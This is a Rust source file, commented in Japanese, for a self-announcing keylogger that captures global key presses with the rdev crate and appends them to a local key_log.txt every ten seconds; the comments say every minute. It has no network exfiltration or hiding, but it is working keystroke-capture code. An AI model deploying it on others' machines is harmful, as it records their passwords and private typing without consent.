// rdevクレートやその他標準ライブラリから必要なアイテムをインポートします.
use rdev::{listen, Event, EventType};
use std::sync::Mutex;
use std::time::{Duration, Instant};
use std::thread;
use std::fs::OpenOptions;
use std::io::Write;
use lazy_static::lazy_static;

// 前回のキー押下時刻を保持するためのグローバルな可変変数を定義します.
lazy_static! {
    static ref LAST_KEY_EVENT: Mutex<Option<Instant>> = Mutex::new(None);
}

// キー入力をバッファするためのグローバルな文字列変数を定義します.
lazy_static! {
    static ref KEY_BUFFER: Mutex<String> = Mutex::new(String::new());
}

// 閾値のミリ秒数を定義します.
// 必要に応じてこの値（nミリ秒）を変更してください.
const THRESHOLD_MILLI_SECS: u64 = 500;

// 1分ごとのファイル書き込み間隔を定義します.
const WRITE_INTERVAL_SECS: u64 = 10;

/// キーイベントを処理するためのコールバック関数です.
fn callback(event: Event) {
    // イベントがキー押下イベントかどうかチェックします.
    if let EventType::KeyPress(key) = event.event_type {
        let now = Instant::now();
        let mut last_event = LAST_KEY_EVENT.lock().unwrap();
        let mut buffer = KEY_BUFFER.lock().unwrap();
        if let Some(previous) = *last_event {
            let elapsed = now.duration_since(previous);
            if elapsed >= Duration::from_millis(THRESHOLD_MILLI_SECS) {
                // 前回のキー入力から時間が空いている場合、改行を追加します
                buffer.push_str("\n");
            }
            else {
                // 前回のキー入力の直後の場合、空白を追加します
                buffer.push_str(" ");
            }
        }
        // 前回のキー押下時刻を更新します.
        *last_event = Some(now);

        // 記録するキーの名前を決定します.
        let key_name = if let Some(name) = event.name {
            if format!("{:?}", &name).len() == 3 {
                match name.as_str() {
                    " " => "<Space>".to_string(),
                    _ => name,
                }
            } else { format!("<{:?}>", key) }
        } else {
            match format!("<{:?}>", key).as_str() {
                "<Unknown(244)>" => "<F>".to_string(),
                "<Unknown(243)>" => "<H>".to_string(),
                "<Unknown(93)>" => "<App>".to_string(),
                _ => format!("<{:?}>", key),
            }
        };
        println!("{:?}", key_name);
        // キー名をグローバルバッファにスペース区切りで追加します.
        buffer.push_str(&key_name);
    }
}

fn main() {
    // キーロガーが開始されたことをユーザーに通知します.
    println!("キーロガーを開始します。キーを押すとキーコードが表示されます...");
    
    // 1分ごとにバッファの内容をテキストファイルに追記するスレッドを生成します.
    thread::spawn(|| {
        loop {
            // 書き込み時間まで待機します.
            thread::sleep(Duration::from_secs(WRITE_INTERVAL_SECS));
            let mut buffer = KEY_BUFFER.lock().unwrap();
            if !buffer.is_empty() {
                // テキストファイルに追記します.
                let mut file = OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open("key_log.txt")
                    .expect("ファイルを開けませんでした");
                if let Err(e) = write!(file, "{}", *buffer) {
                    eprintln!("ファイルへの書き込みに失敗しました: {:?}", e);
                }
                // バッファをクリアします.
                buffer.clear();
            }
        }
    });
    
    // グローバルなキーボードイベントの監視を開始します.
    if let Err(error) = listen(callback) {
        // エラーが発生した場合はエラーメッセージを表示します.
        eprintln!("Error: {:?}", error);
    }
}
